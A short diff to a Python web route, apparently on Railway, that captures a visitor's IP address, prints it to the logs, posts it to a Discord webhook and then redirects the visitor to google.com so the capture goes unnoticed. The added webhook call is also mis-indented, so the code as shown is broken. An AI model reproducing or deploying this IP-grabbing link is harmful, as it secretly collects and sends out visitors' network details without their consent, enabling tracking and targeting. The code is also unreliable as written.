@@ -15,8 +15,8 @@ def index():
         "username": "Railway Logger"
     }
 
-    if DISCORD_WEBHOOK_URL:
-        requests.post(DISCORD_WEBHOOK_URL, json=data)
+    print(f"DEBUG: Found IP {user_ip}") # This will show up in Railway Logs
+requests.post(DISCORD_WEBHOOK_URL, json=data)
 
     return redirect("https://google.com")
 
